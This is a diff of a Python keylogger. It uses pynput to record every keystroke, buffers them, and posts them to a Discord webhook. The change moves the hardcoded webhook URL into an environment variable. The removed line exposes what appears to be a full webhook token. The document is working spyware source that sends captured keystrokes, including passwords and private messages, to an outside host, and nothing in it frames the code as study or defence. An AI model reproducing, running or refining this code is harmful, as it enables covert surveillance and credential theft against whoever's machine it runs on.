@@ -1,19 +1,17 @@
-import requests
+from dotenv import load_dotenv
+import requests, time, os
 from pynput import keyboard
 import threading
-import time
-
-WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1285284225011945472/SX1X6-7wLEme6JdTr31kAs4tYjF_gCRSpxTb1DTXZR4xh0o1U6KvsZTy1aGp1STXhaQk'
+load_dotenv()
 
 key_buffer = []
 BUFFER_SIZE = 100
 lock = threading.Lock()
+WEBHOOK_URL = os.getenv("WEBHOOK_URL")
 
 def send_to_discord(message):
     try:
-        data = {
-            'content': message
-        }
+        data = { 'content': message }
         response = requests.post(WEBHOOK_URL, json=data)
         if response.status_code != 204:
             print(f"Failed to send message to Discord. Status code: {response.status_code}")
@@ -65,21 +63,20 @@ def on_press(key):
                 key_entry = f'{special_key}'
             else:
                 return
-        
+
         with lock:
             key_buffer.append(key_entry)
             if len(key_buffer) >= BUFFER_SIZE:
                 message = ''.join(key_buffer)
                 key_buffer.clear()
                 send_to_discord(message)
-    
+
     except Exception as e:
         print("ERROR: Could not process key:", e)
 
 def start_keylogger():
     buffer_thread = threading.Thread(target=process_buffer, daemon=True)
     buffer_thread.start()
-    
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
 
